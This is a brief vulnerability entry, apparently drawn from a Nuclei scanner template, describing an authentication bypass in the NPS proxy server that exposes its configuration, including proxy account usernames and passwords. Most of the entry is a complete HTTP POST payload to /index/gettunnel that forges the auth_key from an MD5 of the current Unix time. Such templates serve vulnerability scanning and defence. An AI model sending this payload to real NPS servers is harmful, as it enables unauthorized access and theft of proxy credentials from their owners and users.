# Vulnerability: NPS - Authentication Bypass
**Classification:** NPS
**Source:** Nuclei Template (`nps-auth-bypass.yaml`)

## Description
This will reveal all parameters configured on the NPS, including the account username and password of the proxy.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index/gettunnel HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
```

